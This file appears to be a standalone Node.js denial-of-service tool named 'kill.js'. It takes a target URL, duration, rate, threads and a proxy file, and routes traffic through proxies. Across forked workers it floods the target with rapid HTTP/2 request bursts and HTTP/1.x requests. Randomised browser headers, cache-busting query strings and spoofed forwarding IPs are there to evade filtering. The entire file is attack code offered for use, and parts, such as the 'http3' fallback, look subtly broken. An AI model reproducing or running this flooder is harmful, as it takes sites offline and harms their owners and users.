const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const http = require("http"); // Added for HTTP/1.1 and HTTP/1.0 support

// Placeholder for HTTP/3 (requires external library or custom implementation)
const http3 = require("http3") || null; // Hypothetical, replace with actual HTTP/3 library if available

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on("uncaughtException", () => {});

if (process.argv.length < 7) {
    console.log(`Usage: node kill.js <target> <time> <rate> <threads> <proxyfile>`);
    process.exit(1);
}

const headers = {};

function readLines(filePath) {
    if (!fs.existsSync(filePath)) {
        console.error(`File ${filePath} not found`);
        process.exit(1);
    }
    const lines = fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
    if (lines.length === 0 || lines[0] === "") {
        console.error(`Proxy file ${filePath} is empty`);
        process.exit(1);
    }
    return lines;
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6],
};

const parsedTarget = url.parse(args.target);
if (!parsedTarget.protocol || !parsedTarget.host) {
    console.error("Invalid target URL");
    process.exit(1);
}

const sig = [
    "ecdsa_secp256r1_sha256",
    "ecdsa_secp384r1_sha384",
    "rsa_pss_rsae_sha256",
    "rsa_pkcs1_sha512",
];
const accept_header = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "application/json, text/plain, */*",
    "*/*",
];
const lang_header = ["en-US,en;q=0.9", "vi-VN,vi;q=0.8", "zh-CN,zh;q=0.7"];
const encoding_header = ["gzip, deflate, br", "gzip, deflate", "br"];
const version = [
    '"Google Chrome";v="129"',
    '"Microsoft Edge";v="129"',
    '"Firefox";v="133"',
];
const platforms = ['"Windows"', '"macOS"', '"Linux"'];
const cache_control = ["no-cache", "max-age=0"];
const rateHeaders = [
    { "akamai-origin-hop": randstr(12) },
    { "via": randstr(12) },
    { "x-forwarded-for": `${randomIntn(1, 255)}.${randomIntn(1, 255)}.${randomIntn(1, 255)}.${randomIntn(1, 255)}` },
    { "client-ip": `${randomIntn(1, 255)}.${randomIntn(1, 255)}.${randomIntn(1, 255)}.${randomIntn(1, 255)}` },
];

const siga = randomElement(sig);
const ver = randomElement(version);
const accept = randomElement(accept_header);
const lang = randomElement(lang_header);
const encoding = randomElement(encoding_header);
const platform = randomElement(platforms);
const cache = randomElement(cache_control);
const proxies = readLines(args.proxyFile);

if (cluster.isMaster) {
    console.clear();
    console.log(`Target: ${parsedTarget.host}`);
    console.log(`Duration: ${args.time}`);
    console.log(`Threads: ${args.threads}`);
    console.log(`RPS: ${args.Rate}`);
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
    setTimeout(() => process.exit(0), args.time * 1000);
} else {
    setInterval(runFlooder, 50); // Reduced interval for more synchronized requests
}

class NetSocket {
    constructor() {}

    HTTP(options, callback) {
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
        const buffer = Buffer.from(payload);
        const connection = net.connect({
            host: options.host,
            port: options.port,
            noDelay: true,
        });

        connection.setTimeout(options.timeout * 1000);
        connection.setKeepAlive(true, 60000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", (chunk) => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (!isAlive) {
                connection.destroy();
                return callback(undefined, `error: invalid response from proxy ${options.host}:${options.port}`);
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, `error: timeout exceeded for ${options.host}:${options.port}`);
        });

        connection.on("error", (error) => {
            connection.destroy();
            return callback(undefined, `error: ${error.message} for ${options.host}:${options.port}`);
        });
    }
}

const Socker = new NetSocket();

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    if (!parsedProxy[0] || !parsedProxy[1]) {
        console.error(`Invalid proxy format: ${proxyAddr}`);
        return setTimeout(runFlooder, 1000);
    }

    const proxyOptions = {
        host: parsedProxy[0],
        port: parseInt(parsedProxy[1]),
        address: parsedTarget.host + ":443",
        timeout: 5,
    };

    // Common headers for all protocols
    const commonHeaders = {
        ":method": "GET",
        ":authority": parsedTarget.host,
        ":path": parsedTarget.path + "?" + randstr(10) + "=" + randstr(5),
        ":scheme": "https",
        "sec-ch-ua": ver,
        "sec-ch-ua-platform": platform,
        "accept-encoding": encoding,
        "accept-language": lang,
        "accept": accept,
        "user-agent": `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36`,
        "cache-control": cache,
        ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
    };

    let retryCount = 0;
    const maxRetries = 5;

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) {
            if (connection) connection.destroy();
            if (retryCount < maxRetries) {
                retryCount++;
                console.error(`Retrying (${retryCount}/${maxRetries}) for ${proxyAddr}: ${error}`);
                setTimeout(runFlooder, 1000);
            } else {
                console.error(`Max retries reached for ${proxyAddr}`);
            }
            return;
        }

        // TLS Configuration
        const tlsOptions = {
            secure: true,
            ALPNProtocols: ["h2", "http/1.1", "http/1.0"],
            ciphers: [
                "TLS_AES_128_GCM_SHA256",
                "TLS_AES_256_GCM_SHA384",
                "TLS_CHACHA20_POLY1305_SHA256",
                "ECDHE-ECDSA-AES128-GCM-SHA256",
                "ECDHE-RSA-AES128-GCM-SHA256",
                "ECDHE-ECDSA-AES256-GCM-SHA384",
                "ECDHE-RSA-AES256-GCM-SHA384",
            ].join(":"),
            minVersion: "TLSv1.2",
            maxVersion: "TLSv1.3",
            ecdhCurve: "X25519:P-256:P-384",
            host: parsedTarget.host,
            servername: parsedTarget.host,
            rejectUnauthorized: false,
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
        tlsConn.setKeepAlive(true, 60000);

        // HTTP/2 Request
        const http2Client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 1000,
                initialWindowSize: 6291456,
                maxHeaderListSize: 65536,
                enablePush: false,
            },
            createConnection: () => tlsConn,
        });

        http2Client.on("connect", () => {
            const intervalAttack = setInterval(() => {
                const dynHeaders = { ...commonHeaders };
                for (let i = 0; i < args.Rate; i++) {
                    const request = http2Client.request(dynHeaders);
                    request.on("response", () => {
                        request.close();
                        request.destroy();
                    });
                    request.on("error", () => {
                        request.close();
                        request.destroy();
                    });
                    request.end();
                }
            }, 50);
            setTimeout(() => clearInterval(intervalAttack), args.time * 1000);
        });

        http2Client.on("error", () => {
            http2Client.destroy();
            tlsConn.destroy();
            connection.destroy();
            setTimeout(runFlooder, 1000);
        });

        http2Client.on("close", () => {
            http2Client.destroy();
            tlsConn.destroy();
            connection.destroy();
            setTimeout(runFlooder, 1000);
        });

        // HTTP/1.1 and HTTP/1.0 Request
        const httpOptions = {
            host: parsedTarget.host,
            port: 443,
            path: commonHeaders[":path"],
            method: "GET",
            headers: {
                Host: parsedTarget.host,
                "User-Agent": commonHeaders["user-agent"],
                Accept: commonHeaders.accept,
                "Accept-Encoding": commonHeaders["accept-encoding"],
                "Accept-Language": commonHeaders["accept-language"],
                "Cache-Control": commonHeaders["cache-control"],
                Connection: "keep-alive",
                ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
            },
            createConnection: () => tlsConn,
        };

        // HTTP/1.1
        const http11Req = http.request({ ...httpOptions, protocol: "https:" });
        http11Req.on("response", (res) => {
            res.on("data", () => {});
            res.on("end", () => {});
        });
        http11Req.on("error", () => {});
        http11Req.end();

        // HTTP/1.0
        const http10Req = http.request({
            ...httpOptions,
            headers: { ...httpOptions.headers, Connection: "close" },
        });
        http10Req.on("response", (res) => {
            res.on("data", () => {});
            res.on("end", () => {});
        });
        http10Req.on("error", () => {});
        http10Req.end();

        // HTTP/3 (Placeholder, requires actual HTTP/3 library)
        if (http3) {
            const http3Client = http3.connect(parsedTarget.href, {
                protocol: "https:",
                createConnection: () => tlsConn, // Fallback to TLS for QUIC simulation
            });
            const http3Req = http3Client.request(commonHeaders);
            http3Req.on("response", () => {
                http3Req.close();
            });
            http3Req.on("error", () => {
                http3Req.close();
            });
            http3Req.end();
        }
    });
}
